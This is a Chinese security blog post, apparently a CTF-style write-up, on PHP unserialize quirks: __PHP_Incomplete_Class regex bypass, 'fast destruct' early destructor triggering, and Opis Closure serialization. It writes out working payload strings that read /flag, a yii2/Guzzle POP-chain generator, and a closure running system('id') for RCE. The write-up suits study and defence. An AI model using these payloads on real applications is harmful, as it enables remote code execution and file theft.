> 原文链接: https://www.anquanke.com//post/id/251366 


# PHP序列化冷知识


                                阅读量   
                                **20605**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t011fca5d73dfdfbb3b.png)](https://p1.ssl.qhimg.com/t011fca5d73dfdfbb3b.png)



## 0x01 serialize(unserialize($x)) != $x

正常来说一个合法的反序列化字符串，在二次序列化也即反序列化再序列化之后所得到的结果是一致的。

比如

```
&lt;?php

$raw = 'O:1:"A":1:`{`s:1:"a";s:1:"b";`}`';

echo serialize(unserialize($raw));

//O:1:"A":1:`{`s:1:"a";s:1:"b";`}`
```

可以看到即使脚本中没有A这个类，在反序列化序列化过后得到的值依然为原来的值。那么php是怎么实现的呢。

### <a class="reference-link" name="__PHP_Incomplete_Class%20%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84%E7%B1%BB"></a>__PHP_Incomplete_Class 不完整的类

在PHP中，当我们在反序列化一个不存在的类时，会发生什么呢

```
&lt;?php

$raw = 'O:1:"A":1:`{`s:1:"a";s:1:"b";`}`';

var_dump(unserialize($raw));

/*Output:
object(__PHP_Incomplete_Class)#1 (2) `{`
  ["__PHP_Incomplete_Class_Name"]=&gt;
  string(1) "A"
  ["a"]=&gt;
  string(1) "b"
`}`*/
```

可以发现PHP在遇到不存在的类时，会把不存在的类转换成`__PHP_Incomplete_Class`这种特殊的类，同时将原始的类名`A`存放在`__PHP_Incomplete_Class_Name`这个属性中，其余属性存放方式不变。而我们在序列化这个对象的时候，serialize遇到`__PHP_Incomplete_Class`这个特殊类会倒推回来，序列化成`__PHP_Incomplete_Class_Name`值为类名的类，我们看到的序列化结果不是`O:22:"__PHP_Incomplete_Class_Name":2:`{`xxx`}``而是`O:1:"A":1:`{`s:1:"a";s:1:"b";`}``,那么如果我们自己如下构造序列化字符串

[![](https://p4.ssl.qhimg.com/t01fd03c4810dadb720.png)](https://p4.ssl.qhimg.com/t01fd03c4810dadb720.png)

执行结果如下图

[![](https://p0.ssl.qhimg.com/t01a3e15c35940ac23a.png)](https://p0.ssl.qhimg.com/t01a3e15c35940ac23a.png)

可以看到在二次序列化后，由于`O:22:"__PHP_Incomplete_Class":1:`{`s:1:"a";O:7:"classes":0:`{``}``}``中`__PHP_Incomplete_Class_Name`为空，找不到应该绑定的类，其属性就被丢弃了，导致了`serialize(unserialize($x)) != $x`的出现。

### <a class="reference-link" name="%E4%BB%A5%E5%BC%BA%E7%BD%91%E6%9D%AF2021%20WhereIsUWebShell%20%E4%B8%BA%E4%BE%8B"></a>以强网杯2021 WhereIsUWebShell 为例

事实上，在2021强网杯中就有利用到这一点。

下面是简化的代码

```
&lt;?php
// index.php
ini_set('display_errors', 'on');

include "function.php";
$res = unserialize($_REQUEST['ctfer']);
if(preg_match('/myclass/i',serialize($res)))`{`
    throw new Exception("Error: Class 'myclass' not found ");
`}`
highlight_file(__FILE__);
echo "&lt;br&gt;";
highlight_file("myclass.php");
echo "&lt;br&gt;";
highlight_file("function.php");
```

用到的其他文件如下

```
&lt;?php
// myclass.php
class Hello`{`
    public function __destruct()
    `{`   
        if($this-&gt;qwb) echo file_get_contents($this-&gt;qwb);
    `}`
`}`
?&gt;
```

```
&lt;?php
// function.php
function __autoload($classname)`{`
    require_once "./$classname.php";
`}`
?&gt;
```

在这个题目中，我们需要加载`myclass.php`中的`hello`类，但是要引入hello类，根据`__autoload`我们需要一个`classname`为`myclass`的类，这个类并不存在，如果我们直接去反序列化，只会在反序列化myclass类的时候报错无法进入下一步，或者在反序列化Hello的时候找不到这个类而报错。

根据上面的分析，我们可以使用PHP对`__PHP_Incomplete_Class`的特殊处理进行绕过

```
a:2:`{`i:0;O:22:"__PHP_Incomplete_Class":1:`{`s:3:"qwb";O:7:"myclass":0:`{``}``}`i:1;O:5:"Hello":1:`{`s:3:"qwb";s:5:"/flag";`}``}`
```

修改一下`index.php`和`myclass.php`以便更好地看清这一过程

```
&lt;?php
// index.php
ini_set('display_errors', 'on');
include "function.php";
$res = unserialize($_REQUEST['ctfer']);
var_dump($res);
echo '&lt;br&gt;';
var_dump(serialize($res));
if(preg_match('/myclass/i',serialize($res)))`{`
    echo "???";
    throw new Exception("Error: Class 'myclass' not found ");
`}`
highlight_file(__FILE__);
echo "&lt;br&gt;";
highlight_file("myclass.php");
echo "&lt;br&gt;";
highlight_file("function.php");
echo "End";
```

```
&lt;?php
// myclass.php
//class myclass`{``}`
class Hello`{`
    public function __destruct()
    `{`   
        echo "I'm destructed.&lt;br/&gt;";
        var_export($this-&gt;qwb);
        if($this-&gt;qwb) echo file_get_contents($this-&gt;qwb);
    `}`
`}`
?&gt;
```

[![](https://p3.ssl.qhimg.com/t018b9980d9672f8cf2.png)](https://p3.ssl.qhimg.com/t018b9980d9672f8cf2.png)

可以看到在反序列化之后，myclass作为了`__PHP_Incomplete_Class`中属性，会触发autoload引入myclass.php，而对他进行二次序列化时，因为`__PHP_Incomplete_Class`没有`__PHP_Incomplete_Class_Name`该对象会消失，从而绕过`preg_match`的检测，并在最后触发`Hello`类的反序列化。



## 0x02 Fast Destruct——奇怪的反序列化行为出现了

### <a class="reference-link" name="%E5%BC%BA%E7%BD%91%E6%9D%AF2021%20WhereIsUWebShell%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95"></a>强网杯2021 WhereIsUWebShell的另一种解法

还是上面那个题目，事实上，我们通过fast destruct的技术，完全可以不考虑后面设置的waf

Fast destruct是什么呢，在著名的php反序列工具phpggc中提及了这一概念。具体来说，在PHP中有：

1、如果单独执行`unserialize`函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。<br>
2、如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。

在这个题目中，反序列化得到的对象被赋给了`$res`导致`__destruct`在程序结尾才被执行，从而无法绕过`perg_match`代码块中的报错，如果能够进行`fast destruct`,那么就可以提前触发`_destruct`，绕过反序列化报错。

一种方式就是修改序列化字符串的结构，使得完成部分反序列化的unserialize强制退出，提前触发`__destruct`，其中的几种方式如下

```
#修改序列化数字元素个数
a:2:`{`i:0;O:7:"myclass":1:`{`s:1:"a";O:5:"Hello":1:`{`s:3:"qwb";s:5:"/flag";`}``}``}`
```

```
#去掉序列化尾部 `}`
a:1:`{`i:0;O:7:"myclass":1:`{`s:1:"a";O:5:"Hello":1:`{`s:3:"qwb";s:5:"/flag";`}``}`
```

本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的`__destruct()`,提前触发反序列化链条。

### <a class="reference-link" name="fast%20destruct%20%E6%8F%90%E5%89%8D%E8%A7%A6%E5%8F%91%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"></a>fast destruct 提前触发魔术方法

在进一步探索中，fast destruct还引起了一些其他的问题,比如下面这个有趣的示例

[![](https://p5.ssl.qhimg.com/t014c2c692b268f9331.png)](https://p5.ssl.qhimg.com/t014c2c692b268f9331.png)

可以看到，在正常情况下，`Evil`类是被设计禁止反序列化的，在序列化的时候会清空func属性，即使被call,也不会触发`system`,然而由于fast destruct,提前触发的`A::__destruct`,直接访问了`Evil::__call`,导致了命令执行。具体区别可以看下面两张图

[![](https://p0.ssl.qhimg.com/t01da44d74fc7533843.png)](https://p0.ssl.qhimg.com/t01da44d74fc7533843.png)

[![](https://p4.ssl.qhimg.com/t018b5c32727e988e51.png)](https://p4.ssl.qhimg.com/t018b5c32727e988e51.png)

[![](https://p5.ssl.qhimg.com/t01c90acb5c087b9347.png)](https://p5.ssl.qhimg.com/t01c90acb5c087b9347.png)

[![](https://p3.ssl.qhimg.com/t01b571e0e2c1e45060.png)](https://p3.ssl.qhimg.com/t01b571e0e2c1e45060.png)

值得一提的是，`__get`之类的魔术方式也存在这样的执行顺序问题。



## 0x03 Opi/Closure (闭包)函数也能反序列化?

### <a class="reference-link" name="Closure%20%EF%BC%88%E9%97%AD%E5%8C%85%EF%BC%89%E5%87%BD%E6%95%B0%E4%B9%9F%E6%98%AF%E7%B1%BB"></a>Closure （闭包）函数也是类

在php中，除了通过`function()`{``}``定义函数并调用还可以通过如下方式

```
&lt;?php
$func = function($b)`{`
    $a = 1;
    return $a+$b;
`}`;
$func(1);
//Output:2
```

的方式调用函数，这是因为PHP在5.3版本引入了Closure类用于代表匿名函数

实际上$func就是一个Closure类型的对象，根据PHP官方文档，Closure类定义如下。

```
&lt;?
class Closure `{`
    /* 方法 */
    private __construct()
    public static bind(Closure $closure, ?object $newThis, object|string|null $newScope = "static"): ?Closure
    public bindTo(object $newthis, mixed $newscope = 'static'): Closure
    public call(object $newThis, mixed ...$args): mixed
    public static fromCallable(callable $callback): Closure
`}`
```

下面是一个简单的使用示例

```
&lt;?php
class Test`{`
    public $a;
    public function __construct($a=0)`{`
        $this-&gt;a = $a;
    `}`
    public function plus($b)`{`
        return $this-&gt;a+$b;
    `}`
`}`


$funcInObject = function($b)`{`
    echo "Test::Plus\nOutput:".$this-&gt;plus($b)."\n";
    return $this-&gt;a;
`}`;



try`{`
    var_dump(serialize($func));
`}`catch (Exception $e)`{`
    echo $e;
`}`


$myclosure = Closure::bind($funcInObject,new Test(123));

var_dump($myclosure(1));
//Output:int(124)
```

可以看到通过`Closure::bind`我们还可以给闭包传入上下文对象。

一般来说Closure是不允许序列化和反序列化的，直接序列化会`Exception: Serialization of 'Closure' is not allowed`

然而[Opi Closure](https://github.com/opis/closure)库实现了这一功能,通过Opi Clousre，我们可以方便的对闭包进行序列化反序列化，只需要使用`Opis\Closure\serialize()`和`Opis\Closure\unserialize()`即可。

### <a class="reference-link" name="%E4%BB%A5%E7%A5%A5%E4%BA%91%E6%9D%AF2021%20ezyii%E4%B8%BA%E4%BE%8B"></a>以祥云杯2021 ezyii为例

在2021祥云杯比赛中有一个关于yii2的反序列化链,根据所给的文件，很容易发现一条链子

```
Runprocess-&gt;DefaultGenerator-&gt;AppendStream-&gt;CachingStream-&gt;PumpStream
```

也即

```
&lt;?php
namespace Faker`{`
    class DefaultGenerator
    `{`
        protected $default;
        public function __construct($default = null)
        `{`
            $this-&gt;default = $default;
        `}`
    `}`
`}`

namespace GuzzleHttp\Psr7`{`
    use Faker\DefaultGenerator;
    final class AppendStream`{`
        private $streams = [];
        private $seekable = true;
        public function __construct()`{`
            $this-&gt;streams[]=new CachingStream();
        `}`
    `}`
    final class CachingStream`{`
        private $remoteStream;
        public function __construct()`{`
            $this-&gt;remoteStream=new DefaultGenerator(false);
            $this-&gt;stream=new  PumpStream();
        `}`
    `}`
    final class PumpStream`{`
        private $source;
        private $size=-10;
        private $buffer;
        public function __construct()`{`
            $this-&gt;buffer=new DefaultGenerator('whatever');
            $this-&gt;source="????";
        `}`
    `}`
`}`


namespace Codeception\Extension`{`
    use Faker\DefaultGenerator;
    use GuzzleHttp\Psr7\AppendStream;
    class  RunProcess`{`
        protected $output;
        private $processes = [];
        public function __construct()`{`
            $this-&gt;processes[]=new DefaultGenerator(new AppendStream());
            $this-&gt;output=new DefaultGenerator('whatever');
        `}`
    `}`
`}`

namespace `{`
    use Codeception\Extension\RunProcess;
    echo base64_encode(serialize(new RunProcess()));
`}`
```

最后触发的是PumpStream::pump里的`call_user_func($this-&gt;source, $length);`

```
&lt;?php
class PumpStream
`{`
    ...
    private function pump($length)
    `{`
        var_dump("PumpStream::pump",$this,$length);
        if ($this-&gt;source) `{`
            do `{`
                $data = call_user_func($this-&gt;source, $length);
                if ($data === false || $data === null) `{`
                    $this-&gt;source = null;
                    return;
                `}`
                $this-&gt;buffer-&gt;write($data);
                $length -= strlen($data);
            `}` while ($length &gt; 0);
        `}`
    `}`
`}`
```

看起来很美好，然而有个小问题，我们没法控制$length,只能控制$this-&gt;source，这就导致了我们能使用的函数受限，如何解决这一问题呢，这里就用到了我们之前提到的Closure，在题目中引入了这一类库，那么我们可以让$this-&gt;source为一个函数闭包，一个简化的示意代码如下

```
&lt;?php
include("closure/autoload.php");
&lt;?php
class Test`{`
    public $source;
`}`

$func = function()`{`
    $cmd = 'id';
    system($cmd);
`}`;


$raw = \Opis\Closure\serialize($func);

$t = new Test;
$t-&gt;source = unserialize($raw);

$exp = serialize($t);

$o = unserialize($exp);

call_user_func($o-&gt;source,9);
//Output:uid=1000(eki) gid=1000(eki) groups=1000(eki),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
```

可以看到通过这个函数闭包，我们绕过了参数限制，实现了完整的RCE。
